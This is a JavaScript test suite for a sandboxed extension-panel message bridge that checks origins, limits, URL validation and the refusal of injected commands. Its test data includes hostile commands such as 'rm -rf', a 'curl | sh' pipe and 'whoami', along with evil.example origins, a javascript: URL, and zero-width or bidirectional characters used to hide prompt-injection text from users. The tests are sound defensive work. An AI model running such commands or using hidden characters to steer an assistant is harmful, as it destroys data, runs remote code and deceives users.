// The page's side of the panel bridge (lumi/gui/static/panels_view.js): which
// messages from a capability pack's sandboxed panel count, what they may do,
// and what they may not. tests/extension_panels.browser.cjs runs the real
// frame in a browser; this checks the rules message by message.
const {test} = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const vm = require('node:vm');
const path = require('node:path');
const source = fs.readFileSync(path.join(__dirname, '../lumi/gui/static/panels_view.js'), 'utf8');

/** The view's code in a context of its own, with just enough of a page. */
function load(document = {}) {
    const context = vm.createContext({console, Event, Date, setTimeout, clearTimeout});
    context.window = context;
    context.addEventListener = () => {};
    context.document = {
        activeElement: null,
        body: {},
        documentElement: {getAttribute: () => null},
        querySelector: () => null,
        getElementById: () => null,
        ...document,
    };
    vm.runInContext(source, context);
    return context;
}

const plain = value => JSON.parse(JSON.stringify(value));
const TOKEN = 'T'.repeat(32);

test('only requests in the bridge shape count, and each is bounded', () => {
    const {LumiPanelBridge: bridge} = load();
    const check = data => plain(bridge.checkRequest(data));

    assert.deepEqual(check({lumi: 1, id: 1, method: 'context'}), {id: 1, method: 'context'});
    assert.deepEqual(check({lumi: 1, id: 'a', method: 'composer.insert', text: 'Explain the build'}),
        {id: 'a', method: 'composer.insert', text: 'Explain the build', mentions: 0});

    // Not the bridge's at all: ignored, not answered.
    for (const data of [null, 'context', 7, [1], {method: 'context'}, {lumi: 2, method: 'context'},
        {lumi: '1', method: 'context'}, {lumi: 1, id: {}, method: 'context'}, {lumi: 1, id: 1.5, method: 'context'},
        {lumi: 1, id: 'x'.repeat(65), method: 'context'}]) {
        assert.equal(bridge.checkRequest(data), null, JSON.stringify(data));
    }

    // Recognised but refused: answered with why.
    const refused = data => bridge.checkRequest(data).error;
    assert.match(refused({lumi: 1, id: 2, method: 'send'}), /no method "send"/);
    assert.match(refused({lumi: 1, id: 2, method: 'settings.read'}), /no method/);
    assert.match(refused({lumi: 1, id: 2, method: 'x'.repeat(5000)}), /no method "x{40}"\./);
    // A panel can't close itself: that comes only from Escape or the Close button.
    assert.match(refused({lumi: 1, id: 2, method: 'close'}), /presses Escape in it or chooses Close/);
    assert.match(refused({lumi: 1, id: 2, method: 'toast', a: 1, b: 2, c: 3, d: 4, e: 5, f: 6}), /too many fields/);
    assert.match(refused({lumi: 1, id: 2, method: 'composer.insert'}), /up to 8000 characters/);
    assert.match(refused({lumi: 1, id: 2, method: 'composer.insert', text: 'x'.repeat(8001)}), /up to 8000/);
    assert.match(refused({lumi: 1, id: 2, method: 'toast', text: 'x'.repeat(201)}), /up to 200/);
    assert.match(refused({lumi: 1, id: 2, method: 'toast', text: ['a']}), /must be a string/);
    assert.match(refused({lumi: 1, id: 2, method: 'composer.insert', text: ' \u200b\u2060 \n\n\t'}), /text is empty/);
    assert.match(refused({lumi: 1, id: 2, method: 'composer.insert', text: Array(21).fill('line').join('\n')}),
        /at most 20 lines/);
});

test('text reaches the message box as the person sees it, without padding', () => {
    const {LumiPanelBridge: bridge} = load();
    // Zero-width, bidirectional, tag and control characters could hide words
    // the model reads but the person never sees; tabs and line breaks stay.
    const hidden = 'Summarize\u200b the build\u202e\u2066 now\u0007\u0000 \u{E0041}\u{E0042}';
    assert.equal(bridge.visibleText(hidden), 'Summarize the build now ');
    assert.equal(bridge.visibleText('a\r\nb\rc\u2028d\te'), 'a\nb\nc\nd\te');
    assert.equal(bridge.checkRequest({lumi: 1, method: 'toast', text: ' Saved\n\n  twice\u200b '}).text, 'Saved twice');
    // Runs of spaces and blank lines can't push words out of view.
    const tidy = bridge.tidyInsert('\n\n\nFirst' + ' '.repeat(500) + 'line\u00a0\u2003end   \n\n\n\n\n'
        + '\t\t\t\tdeep\n' + ' '.repeat(40) + 'deeper\n\n\n');
    assert.deepEqual(plain(tidy), {text: 'First line end\n\n        deep\n        deeper', lines: 4, mentions: 0});
    assert.equal(bridge.tidyInsert('  keeps\n    short\n      indentation').text, '  keeps\n    short\n      indentation');
});

test('mentions a panel writes attach nothing', () => {
    const {LumiPanelBridge: bridge} = load();
    const text = 'See @file:src/app.py, (@diff:HEAD) and @issue:https://evil.example/o/r/issues/1; '
        + 'mail me at a@b.co: ok. @terminal:"last" @team:x @plan:y @CHECKPOINT:z \u212aeep @chec\u212apoint:1';
    const tidy = bridge.tidyInsert(text);
    assert.equal(tidy.text, 'See @ file:src/app.py, (@ diff:HEAD) and @ issue:https://evil.example/o/r/issues/1; '
        + 'mail me at a@b.co: ok. @ terminal:"last" @ team:x @ plan:y @ CHECKPOINT:z \u212aeep @ chec\u212apoint:1');
    assert.equal(tidy.mentions, 8);
    // What the server reads as an attachment (context_broker.MENTION_RE) no longer matches.
    const serverMention = /(?<!\w)@([a-z][a-z0-9_-]{1,30}):/i;
    assert.equal(serverMention.test(tidy.text), false);
    assert.equal(bridge.tidyInsert('plain @ sign, email me@example.com').mentions, 0);
});

test('text that would run as a command is never added', () => {
    const {LumiPanelBridge: bridge} = load();
    for (const [current, text] of [['', '!!rm -rf ~'], ['', '!git push'], ['', '/team go'], ['  \n', '/plan x'],
        ['', '   !whoami'], [' ', '!x']]) {
        assert.notEqual(bridge.commandStart(bridge.composed(current, text).next), '', JSON.stringify([current, text]));
    }
    // After the person's own words, it's part of their message.
    assert.equal(bridge.commandStart(bridge.composed('Why did', '!important fail?').next), '');
    assert.deepEqual(plain(bridge.composed('Draft', 'more')), {joiner: '\n', next: 'Draft\nmore'});
    assert.deepEqual(plain(bridge.composed('Draft ', 'more')), {joiner: '', next: 'Draft more'});
});

test('a rate limit holds requests to a window', () => {
    const {LumiPanelBridge: bridge} = load();
    let now = 1000;
    const limit = bridge.rateLimit(2, 1000, () => now);
    assert.deepEqual([limit.take(), limit.take(), limit.take()], [true, true, false]);
    now += 999;
    assert.equal(limit.take(), false);
    now += 1;
    assert.equal(limit.take(), true);
});

/** A focusable stand-in for a button in the page. */
function control(name, focused) {
    return {name, isConnected: true, getClientRects: () => [1], focus() { focused.push(name); }};
}

/** A page with an open panel: the frame's window records what the page tells it. */
function openPanel({draft = true, composer = 'Existing draft', launcher = 'menu'} = {}) {
    const focused = [];
    const buttons = {'.titlebar-menu-button': control('menu', focused), '#titlebar-command': control('palette', focused)};
    const context = load({querySelector: selector => buttons[selector] || null});
    const frameWindow = {received: [], postMessage(message, origin) { this.received.push({message: plain(message), origin}); }};
    const frame = {contentWindow: frameWindow};
    const app = Object.create(context.LumiPanelsView.prototype);
    Object.assign(app, {
        sent: [], toasts: [], saved: 0, inputEvents: 0, focused,
        currentCwd: 'D:/work/acme-api', currentSessionId: 's1',
        _currentSessionSummary: () => ({id: 's1', title: 'Fix the flaky test'}),
        _projectNameFromPath: p => p.split('/').pop(),
        _draftScope: draft ? {key: 'draft'} : null,
        inputBar: {style: {display: 'flex'}},
        userInput: {
            value: composer,
            setSelectionRange(start, end) { this.selection = [start, end]; },
            dispatchEvent: event => { app.inputEvents += event.type === 'input' ? 1 : 0; },
            focus() { focused.push('composer'); },
        },
        send(data) { this.sent.push(plain(data)); },
        showToastMessage(message) { this.toasts.push(message); },
        _markDraftEdited() {},
        _saveDraft() { this.saved += 1; },
    });
    const overlay = {removed: false, remove() { this.removed = true; }};
    const notice = {hidden: true, textContent: ''};
    app._extensionPanel = {pack: 'demo', panel: 'stats', title: 'Build stats', packName: 'Demo', token: TOKEN,
        overlay, frame, notice, launcher, port: null, noticeTimer: null,
        limits: {all: context.LumiPanelBridge.rateLimit(20, 1000), toast: context.LumiPanelBridge.rateLimit(1, 1000)}};
    const post = (data, {source = frameWindow, origin = 'null'} = {}) => {
        const before = frameWindow.received.length;
        app._receiveExtensionPanelMessage({data, source, origin});
        return frameWindow.received.slice(before).map(entry => entry.message);
    };
    /** Answer the page's pending pack check, as the server would. */
    const answerCheck = (fields = {ok: true}) => {
        const request = app.sent.filter(message => message.command === 'extension_panel_check').at(-1);
        const before = frameWindow.received.length;
        app.receiveExtensionPanelChecked({event: 'extension_panel_checked', request_id: request.request_id, ...fields});
        return frameWindow.received.slice(before).map(entry => entry.message);
    };
    return {context, app, frame, frameWindow, overlay, notice, focused, post, answerCheck};
}

test('messages count only from the open panel\'s own frame with its opaque origin', () => {
    const {app, post} = openPanel();
    const insert = {lumi: 1, id: 1, method: 'composer.insert', text: 'Injected'};
    assert.deepEqual(post(insert, {source: {postMessage() {}}}), []);          // another frame or window
    assert.deepEqual(post(insert, {origin: 'http://127.0.0.1:48123'}), []);    // not the sandbox's origin
    assert.deepEqual(post(insert, {origin: 'https://evil.example'}), []);
    assert.deepEqual(app.sent, []);
    app._extensionPanel = null;
    assert.deepEqual(post(insert), []);                                         // no panel open
    assert.equal(app.userInput.value, 'Existing draft');
});

test('a panel reads only the project name and the theme', () => {
    const {post} = openPanel();
    assert.deepEqual(post({lumi: 1, id: 7, method: 'context'}),
        [{lumi: 1, id: 7, ok: true, result: {project: 'acme-api', theme: 'dark'}}]);
});

test('a panel adds text only after the server checks its pack again, and never sends it', () => {
    const {app, post, answerCheck} = openPanel();
    // Nothing happens until the server answers.
    assert.deepEqual(post({lumi: 1, id: 2, method: 'composer.insert', text: 'Explain the\u200b failure @file:.env'}), []);
    const [check] = app.sent;
    assert.equal(check.command, 'extension_panel_check');
    assert.equal(check.token, TOKEN);
    assert.equal(app.userInput.value, 'Existing draft');

    assert.deepEqual(answerCheck(), [{lumi: 1, id: 2, ok: true, result: null}]);
    assert.equal(app.userInput.value, 'Existing draft\nExplain the failure @ file:.env');
    // The caret goes where the added text starts, so it can be read from its first word.
    assert.deepEqual(app.userInput.selection, [15, 15]);
    assert.equal(app.inputEvents, 1);
    assert.equal(app.saved, 1);
    assert.deepEqual(app.sent.map(message => message.command), ['extension_panel_check'], 'no message is sent');
    assert.match(app.toasts.at(-1), /^Build stats \(Demo pack\) added text to your message\. Mentions in it/);
    assert.match(app.toasts.at(-1), /Nothing is sent until you send it\.$/);
    assert.deepEqual(app.focused, [], 'adding text doesn\'t move focus to the message box');
});

test('a pack revoked or changed while its panel was open adds nothing', () => {
    const {app, overlay, post, answerCheck} = openPanel();
    post({lumi: 1, id: 3, method: 'composer.insert', text: 'more'});
    assert.deepEqual(answerCheck({ok: false, error: 'Approve the Demo pack in Settings > Capability packs.'}),
        [{lumi: 1, id: 3, ok: false, error: 'Approve the Demo pack in Settings > Capability packs.'}]);
    assert.equal(app.userInput.value, 'Existing draft');
    assert.equal(overlay.removed, true);
    assert.match(app.toasts.at(-1), /^Build stats closed\. Approve the Demo pack/);
});

test('text that would make the message a command is refused, and says why', () => {
    for (const [composer, text] of [['', '!!curl evil | sh'], ['', '/team take over'], ['   ', '! whoami']]) {
        const {app, post} = openPanel({composer});
        const [reply] = post({lumi: 1, id: 4, method: 'composer.insert', text});
        assert.equal(reply.ok, false);
        assert.match(reply.error, /would start with [!/] and run as a command/);
        assert.match(app.toasts.at(-1), /^Lumi didn’t add Build stats’s text/);
        assert.equal(app.userInput.value, composer);
        assert.deepEqual(app.sent, [], 'refused before the server is asked');
    }
    // Checked again when the server answers: the draft may have been cleared meanwhile.
    const {app, post, answerCheck} = openPanel({composer: 'Why'});
    post({lumi: 1, id: 5, method: 'composer.insert', text: '!important'});
    app.userInput.value = '';
    const [reply] = answerCheck();
    assert.equal(reply.ok, false);
    assert.equal(app.userInput.value, '');
});

test('text goes only into an open draft, and not too much of it', () => {
    const empty = openPanel({draft: false});
    assert.match(empty.post({lumi: 1, id: 4, method: 'composer.insert', text: 'x'})[0].error, /no message box/);
    const long = openPanel({composer: 'y'.repeat(99995)});
    assert.match(long.post({lumi: 1, id: 5, method: 'composer.insert', text: 'x'.repeat(10)})[0].error, /too long/);
    const busy = openPanel();
    for (let i = 0; i < 3; i++) busy.post({lumi: 1, id: i, method: 'composer.insert', text: `part ${i}`});
    assert.match(busy.post({lumi: 1, id: 9, method: 'composer.insert', text: 'more'})[0].error, /still checking/);
});

test('a panel\'s notices stay in its dialog, marked as its pack\'s, one a second', () => {
    const {app, notice, post} = openPanel();
    assert.equal(post({lumi: 1, id: 1, method: 'toast', text: 'Saved'})[0].ok, true);
    assert.match(post({lumi: 1, id: 2, method: 'toast', text: 'Again'})[0].error, /one notice a second/);
    assert.equal(notice.textContent, 'Panel · Demo: Saved');
    assert.equal(notice.hidden, false);
    assert.deepEqual(app.toasts, [], 'Lumi\'s own notices are never the panel\'s');
});

test('refused and unknown requests are answered, and requests are rate limited', () => {
    const {app, post} = openPanel();
    assert.deepEqual(post({lumi: 1, id: 9, method: 'bash', command: 'rm -rf /'}),
        [{lumi: 1, id: 9, ok: false, error: 'The panel bridge has no method "bash".'}]);
    const replies = [];
    for (let i = 0; i < 25; i++) replies.push(...post({lumi: 1, id: i, method: 'context'}));
    // The refused request above already counted toward the 20 a second.
    assert.equal(replies.filter(reply => reply.ok).length, 19);
    assert.match(replies.at(-1).error, /Too many requests/);
    assert.deepEqual(app.sent, []);
});

test('a panel can\'t close itself; Escape reaches the page only over the bridge\'s private channel', () => {
    const {context, app, frame, overlay, post} = openPanel();
    context.document.activeElement = frame;
    // A close request posted like any other message is refused, focused or not.
    assert.match(post({lumi: 1, id: 1, method: 'close'})[0].error, /presses Escape in it or chooses Close/);
    assert.equal(overlay.removed, false);

    // The page hands the bridge a port when the panel loads; only that port's "close" counts.
    const ports = [];
    context.MessageChannel = class {
        constructor() {
            this.port1 = {closed: false, close() { this.closed = true; }};
            this.port2 = {transferred: true};
            ports.push(this);
        }
    };
    const panel = app._extensionPanel;
    frame.contentWindow.postMessage = (message, origin, transfer) => {
        frame.contentWindow.handed = {message: plain(message), origin, transfer};
    };
    app._openExtensionPanelChannel(panel);
    assert.deepEqual(frame.contentWindow.handed.message, {lumi: 1, event: 'port'});
    assert.equal(frame.contentWindow.handed.transfer[0], ports[0].port2);
    // A reload of the panel's page gets a new channel; the old one is closed and ignored.
    app._openExtensionPanelChannel(panel);
    assert.equal(ports[0].port1.closed, true);
    ports[0].port1.onmessage({data: {lumi: 1, method: 'close'}});
    assert.equal(overlay.removed, false);
    // Without focus in the panel, "close" doesn't count either.
    context.document.activeElement = null;
    ports[1].port1.onmessage({data: {lumi: 1, method: 'close'}});
    assert.equal(overlay.removed, false);
    context.document.activeElement = frame;
    ports[1].port1.onmessage({data: {lumi: 1, method: 'close'}});
    assert.equal(overlay.removed, true);
    assert.equal(ports[1].port1.closed, true);
    assert.deepEqual(app.sent, [{command: 'extension_panel_close', token: TOKEN}]);
});

test('closing a panel returns focus to where panels open, never to the message box', () => {
    const fromMenu = openPanel({launcher: 'menu'});
    fromMenu.app.closeExtensionPanel();
    assert.deepEqual(fromMenu.focused, ['menu']);
    const fromPalette = openPanel({launcher: 'palette'});
    fromPalette.app.closeExtensionPanel();
    assert.deepEqual(fromPalette.focused, ['palette']);
    // With neither button showing, focus stays put rather than landing in the message box.
    const hidden = openPanel();
    hidden.context.document.querySelector = () => null;
    hidden.app.closeExtensionPanel();
    assert.deepEqual(hidden.focused, []);
});

test('the page frames only a panel URL from its own server', () => {
    const {app} = openPanel();
    const shown = [];
    app._showExtensionPanel = (info, launcher) => shown.push({...plain(info), launcher});
    const opened = url => ({event: 'extension_panel_opened', request_id: 'r', pack: 'demo', pack_name: 'Demo',
        panel: 'stats', title: 'Build stats', token: TOKEN, url});
    for (const url of ['https://evil.example/panels/x', '/static/app.js', 'javascript:alert(1)',
        '//evil.example/panels/' + TOKEN + '/index.html', '/panels/short/index.html',
        '/panels/' + TOKEN + '/index.html?x=1', undefined]) {
        app._extensionPanelOpening = {requestId: 'r', launcher: 'menu'};
        app.receiveExtensionPanelOpened(opened(url));
    }
    assert.deepEqual(shown, []);
    // Only an answer to this page's latest request; an earlier one's token is withdrawn.
    app._extensionPanelOpening = {requestId: 'mine', launcher: 'menu'};
    app.receiveExtensionPanelOpened(opened(`/panels/${TOKEN}/index.html`));
    assert.deepEqual(shown, []);
    assert.deepEqual(app.sent.at(-1), {command: 'extension_panel_close', token: TOKEN});
    app._extensionPanelOpening = {requestId: 'r', launcher: 'palette'};
    app.receiveExtensionPanelOpened(opened(`/panels/${TOKEN}/index.html`));
    assert.equal(shown.length, 1);
    assert.equal(shown[0].url, `/panels/${TOKEN}/index.html`);
    assert.equal(shown[0].launcher, 'palette');
    // A refusal is shown, and the list asked for again.
    app._extensionPanelOpening = {requestId: 'r2', launcher: 'menu'};
    app.receiveExtensionPanelOpened({event: 'extension_panel_opened', request_id: 'r2', error: 'Approve the Demo pack.'});
    assert.equal(app.toasts.at(-1), 'Approve the Demo pack.');
    assert.deepEqual(app.sent.at(-1), {command: 'extension_panels'});
});

test('a panel whose pack leaves the list, or whose connection drops, closes at once', () => {
    const {app, overlay} = openPanel();
    app.receiveExtensionPanels({event: 'extension_panels', enabled: true,
        panels: [{pack: 'demo', pack_name: 'Demo', panel: 'stats', title: 'Build stats'}, {pack: 1}]});
    assert.equal(overlay.removed, false);
    assert.deepEqual(plain(app._extensionPanels), [{pack: 'demo', pack_name: 'Demo', panel: 'stats', title: 'Build stats'}]);
    app.receiveExtensionPanels({event: 'extension_panels', enabled: true, panels: []});
    assert.equal(overlay.removed, true);
    assert.match(app.toasts.at(-1), /^Build stats closed\. Its pack is no longer approved/);
    // Turned off: nothing is listed, whatever the rows say.
    app.receiveExtensionPanels({event: 'extension_panels', enabled: false, reason: 'Off.',
        panels: [{pack: 'demo', pack_name: 'Demo', panel: 'stats', title: 'Build stats'}]});
    assert.deepEqual(plain(app._extensionPanels), []);

    const dropped = openPanel();
    dropped.app.extensionPanelsDisconnected();
    assert.equal(dropped.overlay.removed, true);
    assert.match(dropped.app.toasts.at(-1), /connection dropped/);
});

test('the command palette lists panels and asks for a fresh list at most every few seconds', () => {
    const {app} = openPanel();
    app._extensionPanels = [{pack: 'demo', pack_name: 'Demo', panel: 'stats', title: 'Build stats'}];
    const commands = app.extensionPanelCommands();
    assert.deepEqual(commands.map(c => [c.id, c.label, c.hint]), [['panel:demo/stats', 'Open panel: Build stats', 'Demo']]);
    app.extensionPanelCommands();
    assert.deepEqual(app.sent, [{command: 'extension_panels'}]);
    commands[0].action();
    assert.equal(app._extensionPanelOpening.launcher, 'palette');
});

test('only a browser or the Windows desktop window opens panels', () => {
    for (const [host, blocked] of [
        [{}, false],
        [{pywebview: {platform: 'edgechromium'}}, false],
        [{pywebview: {platform: 'cocoa'}}, true],
        [{pywebview: {platform: 'gtkwebkit2'}}, true],
        [{pywebview: {platform: 'qtwebengine'}}, true],
        [{webkit: {messageHandlers: {jsBridge: {}}}}, true],
        [{qt: {webChannelTransport: {}}}, true],
    ]) {
        const {context, app} = openPanel();
        Object.assign(context, host);
        app.openExtensionPanel('demo', 'stats');
        assert.equal(app.sent.length === 0, blocked, JSON.stringify(host));
        if (blocked) assert.match(app.toasts.at(-1), /Open in Browser/);
    }
});
